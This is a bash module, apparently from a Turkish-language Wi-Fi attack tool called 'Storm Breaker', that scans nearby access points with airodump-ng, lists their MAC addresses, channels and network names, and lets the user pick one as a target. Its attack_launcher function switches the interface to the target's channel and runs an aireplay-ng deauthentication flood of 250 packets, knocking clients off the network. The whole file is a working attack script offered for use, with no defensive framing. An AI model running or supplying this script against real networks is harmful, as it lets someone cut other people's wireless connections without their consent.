#!/usr/bin/env bash
#THİS MODULE SCAN AND ATTACK FUNCTİONS

# İMPORT REQUİREMENTS MODULES

source $(pwd)/lib/printer_utils.sh 

mode_checker() {
	iwconfig $1 > /dev/null 2>&1
	if [[ $(iwconfig $1|grep -o "Mode:[A-Za-z]*"|cut -d ":" -f2) == "Managed" ]]; then
		echo_error "SALDIRI YAPABİLMEK İÇİN İZLEME MODU GEREKLİDİR"
	else
		wifi_scanner $1
	fi  
}


choose_a_mac() {
	counter=1
	IFACE=$1
	while IFS= read -r line
	do

	CH=""
	MAC=""
	BSSID=""
	RANKING=""
	if [[  $line =~ " " ]]; then
   		if [[ ${line:0:5} == "BSSID" ]]; then
      		echo "" > /dev/null 2>&1
   		elif [[ ${line:0:7} == "Station" ]]; then
      		break
   	   	else
       		ch=$(echo $line|cut -d "," -f4)
       		bssid=$(echo $line|cut -d "," -f14)
       		mac=$(echo $line|cut -d "," -f1)
       		ranking=$(echo $line|cut -d "," -f9|cut -d "-" -f2)
       		BSSID[$counter]=$(echo $bssid|sed -e "s| |-|g")
       		MAC[$counter]="$mac"
       		CH[$counter]="$ch"
       		RANKING[$counter]="$ranking"
       		((counter++))
   sleep 1
   fi
fi
done < input-01.csv
echo -e "MAC    \t\t\tCHANNEL\t     BSSID"
for ((i=1;i<${#CH[@]};i++)); do
     if [[ ${RANKING[$i]} -le 50 ]]; then
     	echo -e "[00$i] \e[1;31m${MAC[$i]}\t   ${CH[$i]}\t    ${BSSID[$i]^^} ~ BEST QUALİTY"
     else
        echo -e "[00$i] \e[1;33m${MAC[$i]}\t   ${CH[$i]}\t    ${BSSID[$i]^^}"
     fi
done
echo -e "[00${#BSSID[@]}] GERİ"
while [[ true ]]; do
	read -p "> " islem
	if [[ -z $islem ]]; then
		echo "" > /dev/null
	else
		if [[ $islem == ${#BSSID[@]} ]]; then
			select_iface
		else
			TARGET_MAC="${MAC[$islem]}"
			TARGET_BSSID="${BSSID[$islem]}"
			TARGET_CH="${CH[$islem]}"
			INTERFACE="$1"
			attack_launcher $TARGET_MAC $TARGET_CH $TARGET_BSSID $IFACE
		fi
	
	fi
done

}
ctrl_z() {
	exit
}
wifi_scanner() {
	trap ctrl_z SIGTSTP
	if [[ -e "$(pwd)/input-01.csv" ]]; then
		rm -rf $(pwd)/input-01.csv
	else
		echo_status "TARAYICI ÇALISTIRILIYOR"
	xterm -hold -title "STORM BREAKER WİFİ SCANNER" -geometry 110x50 -sb -sl 1000 -e "sudo airodump-ng -w input --output-format "csv" $1"
	if [[ -e "input-01.csv" ]]; then
		if [[ -z $(cat input-01.csv) ]]; then
			echo_error "Hiçbir AP BULUNAMADI"
		else
			choose_a_mac $1
		fi
	else
		wifi_scanner
	fi
fi

}

attack_launcher() {
	ifconfig $4 down
	iwconfig $4 channel $2
	ifconfig $4 up
	sudo xterm -hold -title "ATTACK LAUNCHER" -geometry 110x50 -sb -sl 1000 -e "aireplay-ng -0 250 -a $1 $4"
}